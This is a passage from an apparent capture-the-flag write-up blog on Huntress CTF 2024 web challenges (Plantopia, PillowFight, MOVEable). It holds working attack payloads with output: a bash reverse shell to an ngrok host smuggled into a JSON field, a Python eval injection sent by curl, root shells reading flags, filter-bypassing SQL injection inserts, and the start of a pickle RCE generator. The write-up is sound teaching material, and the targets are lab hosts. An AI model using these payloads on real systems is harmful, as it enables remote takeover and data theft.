<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;plant_id&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;alert_command&#34;</span><span class="p">:</span> <span class="s2">&#34;/usr/sbin/sendmail -t; bash -c &#39;bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/14052 0&gt;&amp;1&#39;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;watering_threshold&#34;</span><span class="p">:</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After executing sendmail:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/huntressctf]
</span></span><span class="line"><span class="cl">└─$ nc -nvlp 8080                      
</span></span><span class="line"><span class="cl">listening on [any] 8080 ...
</span></span><span class="line"><span class="cl">connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 47598
</span></span><span class="line"><span class="cl">bash: cannot set terminal process group (1): Inappropriate ioctl for device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">root@plantopia-4f0ea2e6b6415cf0-55ff95c748-sl457:/srv/app# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
</span></span><span class="line"><span class="cl">root@plantopia-4f0ea2e6b6415cf0-55ff95c748-sl457:/srv/app# cat flag.txt
</span></span><span class="line"><span class="cl">cat flag.txt
</span></span><span class="line"><span class="cl">flag{c29c4d53fc432f7caeb573a9f6eae6c6}
</span></span><span class="line"><span class="cl">root@plantopia-4f0ea2e6b6415cf0-55ff95c748-sl457:/srv/app# 
</span></span></code></pre></td></tr></table>
</div>
</div><p>No curl or wget by the way:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@plantopia-4f0ea2e6b6415cf0-55ff95c748-sl457:/srv/app# which wget
</span></span><span class="line"><span class="cl">which wget
</span></span><span class="line"><span class="cl">root@plantopia-4f0ea2e6b6415cf0-55ff95c748-sl457:/srv/app# which curl
</span></span><span class="line"><span class="cl">which curl
</span></span><span class="line"><span class="cl">root@plantopia-4f0ea2e6b6415cf0-55ff95c748-sl457:/srv/app# find / -name &#34;wget&#34; 2&gt;/dev/null
</span></span><span class="line"><span class="cl">&lt;748-sl457:/srv/app# find / -name &#34;wget&#34; 2&gt;/dev/null       
</span></span><span class="line"><span class="cl">root@plantopia-4f0ea2e6b6415cf0-55ff95c748-sl457:/srv/app#
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<h3 id="helpfuldesk">HelpfulDesk
</h3><blockquote>
<p>HelpfulDesk is the go-to solution for small and medium businesses who need remote monitoring and management. Last night, HelpfulDesk released a security bulletin urging everyone to patch to the latest patch level. They were scarce on the details, but I bet that can&rsquo;t be good&hellip;</p>
<p>Author: @HuskyHacks</p>
</blockquote>
<p>Quite surprised there hadn&rsquo;t been more solves on this challenge, as I immediately recognized it as a recycled question from <a class="link" href="https://github.com/BaadMaro/CTF/tree/main/NahamCon%20CTF%202024/HelpfulDesk"  target="_blank" rel="noopener"
    >a previous CTF</a>. This linked write-up is quite well made, so I recommend checking them out to see how this challenge is solved ;)</p>
<hr>
<h3 id="pillowfight">PillowFight
</h3><blockquote>
<p>PillowFight uses <em><strong>advanced AI/MLRegressionLearning</strong>*</em> to combine two images of your choosing<br>
-note to investors this is not techically true at the moment we&rsquo;re using a python library but please give us money and we&rsquo;ll deliver it we promise.</p>
<p>Author: @HuskyHacks</p>
</blockquote>
<p>The Landing page here is a nice image combiner tool:</p>
<p><img src="/post/huntress-ctf-2024/Images/PillowFight_LandingPage.png"
	width="667"
	height="687"
	srcset="/post/huntress-ctf-2024/Images/PillowFight_LandingPage_hu4697255584480907969.png 480w, /post/huntress-ctf-2024/Images/PillowFight_LandingPage_hu11555573748258734855.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="97"
		data-flex-basis="233px"
	
></p>
<p>Once again we are seeing Python, and once again we are seeing API documentation? It&rsquo;s even Swagger-based again:</p>
<p><img src="/post/huntress-ctf-2024/Images/PillowFight_API1.png"
	width="1473"
	height="799"
	srcset="/post/huntress-ctf-2024/Images/PillowFight_API1_hu15908112421584669145.png 480w, /post/huntress-ctf-2024/Images/PillowFight_API1_hu11931594985901255616.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="184"
		data-flex-basis="442px"
	
></p>
<p>This one seems pretty straightforward as well, since there is a field for <code>eval_command</code>. I have done a few python jails in my time, and a specific escape that I did on an <code>eval</code> command I can recall in the <a class="link" href="https://spencerja.github.io/post/hackthebox-busqueda/"  target="_blank" rel="noopener"
    >Hack The Box exercise Busqueda</a>. Here, I basically just use the same payload and swap out the IP address for my ngrok:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__import__(&#39;os&#39;).system(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/2.tcp.ngrok.io/17256 0&gt;&amp;1&#34;&#39;)#
</span></span></code></pre></td></tr></table>
</div>
</div><p>The swagger submission provides a simple curl of my submission, which looks like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -X POST &#34;http://challenge.ctf.games:31774/combine&#34; -H &#34;accept: image/png&#34; -H &#34;Content-Type: multipart/form-data&#34; -F &#34;image1=@7d5.jpg;type=image/jpeg&#34; -F &#34;image2=@7d5.jpg;type=image/jpeg&#34; -F &#34;eval_command=__import__(&#39;os&#39;).system(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/2.tcp.ngrok.io/17256 0&gt;&amp;1&#34;&#39;)#&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Despite the apparent quotation issues in the curl request, the reverse shell still hits my kali:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/huntressctf]
</span></span><span class="line"><span class="cl">└─$ nc -nvlp 8080
</span></span><span class="line"><span class="cl">listening on [any] 8080 ...
</span></span><span class="line"><span class="cl">connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 42116
</span></span><span class="line"><span class="cl">bash: cannot set terminal process group (1): Inappropriate ioctl for device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">root@pillowfight-36bcbaf9e30833e7-d4d844d7-b6fth:/app# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
</span></span><span class="line"><span class="cl">root@pillowfight-36bcbaf9e30833e7-d4d844d7-b6fth:/app# cat flag.txt
</span></span><span class="line"><span class="cl">cat flag.txt
</span></span><span class="line"><span class="cl">flag{b6b62e6c5cdfda3b3a8b87d90fd48d01}
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<h3 id="moveable">MOVEable
</h3><blockquote>
<p>Ever wanted to move your files? You know, like with a fancy web based GUI instead of just FTP or something?<br>
Well now you can, with our super secure app, <strong>MOVEable</strong>!<br>
Escalate your privileges and find the flag.</p>
<p>Author: @JohnHammond#6971</p>
</blockquote>
<p>For this challenge we get source code. As a start, the login design is instantly notable:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>  
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login_user</span><span class="p">():</span>  
</span></span><span class="line"><span class="cl">   <span class="n">username</span> <span class="o">=</span> <span class="n">DBClean</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span>  
</span></span><span class="line"><span class="cl">   <span class="n">password</span> <span class="o">=</span> <span class="n">DBClean</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span>  
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">   <span class="n">conn</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">   <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">   <span class="n">sql</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;SELECT * FROM users WHERE username=&#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39; AND password=&#39;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#39;&#34;</span>  
</span></span><span class="line"><span class="cl">   <span class="n">c</span><span class="o">.</span><span class="n">executescript</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">   <span class="n">user</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="n">user</span><span class="p">:</span>  
</span></span><span class="line"><span class="cl">       <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT sessionid FROM activesessions WHERE username=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>  
</span></span><span class="line"><span class="cl">       <span class="n">active_session</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">       <span class="k">if</span> <span class="n">active_session</span><span class="p">:</span>  
</span></span><span class="line"><span class="cl">           <span class="n">session_id</span> <span class="o">=</span> <span class="n">active_session</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>  
</span></span><span class="line"><span class="cl">       <span class="k">else</span><span class="p">:</span>  
</span></span><span class="line"><span class="cl">           <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT username FROM users WHERE username=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>  
</span></span><span class="line"><span class="cl">           <span class="n">user_name</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">           <span class="k">if</span> <span class="n">user_name</span><span class="p">:</span>  
</span></span><span class="line"><span class="cl">               <span class="n">session_id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>  
</span></span><span class="line"><span class="cl">               <span class="n">c</span><span class="o">.</span><span class="n">executescript</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;INSERT INTO activesessions (sessionid, timestamp) VALUES (&#39;</span><span class="si">{</span><span class="n">session_id</span><span class="si">}</span><span class="s2">&#39;, &#39;</span><span class="si">{</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S.</span><span class="si">%f</span><span class="s1">&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#39;)&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">           <span class="k">else</span><span class="p">:</span>  
</span></span><span class="line"><span class="cl">               <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;A session could be not be created&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">               <span class="k">return</span> <span class="n">logout</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">          
</span></span><span class="line"><span class="cl">       <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>  
</span></span><span class="line"><span class="cl">       <span class="n">session</span><span class="p">[</span><span class="s1">&#39;session_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">session_id</span>  
</span></span><span class="line"><span class="cl">       <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">       <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;files&#39;</span><span class="p">))</span>  
</span></span><span class="line"><span class="cl">   <span class="k">else</span><span class="p">:</span>  
</span></span><span class="line"><span class="cl">       <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Username or password is incorrect&#39;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">       <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It looks as though SQL injection is possible. When we look at the sanitizing function DBClean:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">DBClean</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>  
</span></span><span class="line"><span class="cl">   <span class="k">for</span> <span class="n">bad_char</span> <span class="ow">in</span> <span class="s2">&#34; &#39;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">:</span>  
</span></span><span class="line"><span class="cl">       <span class="n">string</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">bad_char</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It looks like whitespace and quotation marks are replaced with nothing (removed), and backslash characters are replaced with single quotes. Portswigger has a great resource on <a class="link" href="https://portswigger.net/support/sql-injection-bypassing-common-filters"  target="_blank" rel="noopener"
    >bypassing common filters for SQL injection</a>. We can utilize inline comments <code>/**/</code> to simulate spaces, and backslashes in substitution for single quotes:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\/**/OR/**/1=1--
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/post/huntress-ctf-2024/Images/MOVEit_Log1.png"
	width="503"
	height="417"
	srcset="/post/huntress-ctf-2024/Images/MOVEit_Log1_hu2299940326391683486.png 480w, /post/huntress-ctf-2024/Images/MOVEit_Log1_hu17088099874900414269.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="120"
		data-flex-basis="289px"
	
></p>
<p>Unfortunately, this does not work. Seemingly this is because during the initialization there is no account creation in the database:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">init_db</span><span class="p">():</span>  
</span></span><span class="line"><span class="cl">   <span class="k">with</span> <span class="n">app</span><span class="o">.</span><span class="n">app_context</span><span class="p">():</span>  
</span></span><span class="line"><span class="cl">       <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">       <span class="n">c</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">       <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;CREATE TABLE IF NOT EXISTS users (username text, password text)&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">       <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;CREATE TABLE IF NOT EXISTS activesessions (sessionid text, username text, timestamp text)&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">       <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;CREATE TABLE IF NOT EXISTS files (filename text PRIMARY KEY, data blob, sessionid text)&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">       <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;INSERT OR IGNORE INTO files VALUES (&#39;flag.txt&#39;, ?, NULL)&#34;</span><span class="p">,</span>  
</span></span><span class="line"><span class="cl">                 <span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;lol just kidding this isnt really where the flag is&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">),))</span>  
</span></span><span class="line"><span class="cl">       <span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>With SQL injection here, I thought we could insert our own account into the user table:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user\;/**/INSERT/**/INTO/**/users/**/(username,/**/password)/**/VALUES/**/(\user\,/**/\user\)--
</span></span></code></pre></td></tr></table>
</div>
</div><p>If the SQL execution fails we receive a 500 error. So when I see an error referring to login, I know my SQL injection is not producing the errors. However, even after adding <code>user:user</code> I was still unable to login.</p>
<p>We cannot hit the <code>files</code> page without first authenticating due to how login &ldquo;creates&rdquo; the session. However, if we inject an entry into <code>activesessions</code> table, we can perform downloads:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/download/&lt;filename&gt;/&lt;sessionid&gt;&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>  
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">download_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">sessionid</span><span class="p">):</span>  
</span></span><span class="line"><span class="cl">   <span class="n">conn</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">   <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">   <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT * FROM activesessions WHERE sessionid=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">sessionid</span><span class="p">,))</span>  
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">   <span class="n">active_session</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="n">active_session</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>  
</span></span><span class="line"><span class="cl">       <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;No active session found&#39;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">       <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">))</span>  
</span></span><span class="line"><span class="cl">   <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT data FROM files WHERE filename=?&#34;</span><span class="p">,(</span><span class="n">filename</span><span class="p">,))</span>  
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">   <span class="n">file_data</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="n">file_data</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>  
</span></span><span class="line"><span class="cl">       <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;File not found&#39;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">       <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;files&#39;</span><span class="p">))</span>  
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">   <span class="n">file_blob</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">file_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>  
</span></span><span class="line"><span class="cl">   <span class="k">try</span><span class="p">:</span>       
</span></span><span class="line"><span class="cl">       <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">file_blob</span><span class="p">),</span> <span class="n">download_name</span><span class="o">=</span><span class="n">filename</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">   <span class="k">except</span> <span class="ne">TypeError</span><span class="p">:</span>  
</span></span><span class="line"><span class="cl">       <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;ERROR: Failed to retrieve file. Are you trying to hack us?!?&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">       <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;files&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is something very important in downloads that I overlooked for a long time:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">   <span class="n">file_data</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="n">file_data</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>  
</span></span><span class="line"><span class="cl">       <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;File not found&#39;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">       <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;files&#39;</span><span class="p">))</span>  
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">   <span class="n">file_blob</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">file_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can inject into tables, so we can add pickle data to the <code>data</code> table and abuse <a class="link" href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/"  target="_blank" rel="noopener"
    >Pickle RCE methods</a>! Firstly, injecting an active session:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\;/**/INSERT/**/INTO/**/activesessions/**/VALUES/**/(\1\,/**/\user\,/**/\2024-10-27 23:10:1730089965.112070\)--
</span></span></code></pre></td></tr></table>
</div>
</div><p>For a pickle payload generator, I based my commands from <a class="link" href="https://github.com/CalfCrusher/Python-Pickle-RCE-Exploit"  target="_blank" rel="noopener"
    >this github repo</a>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python  </span>
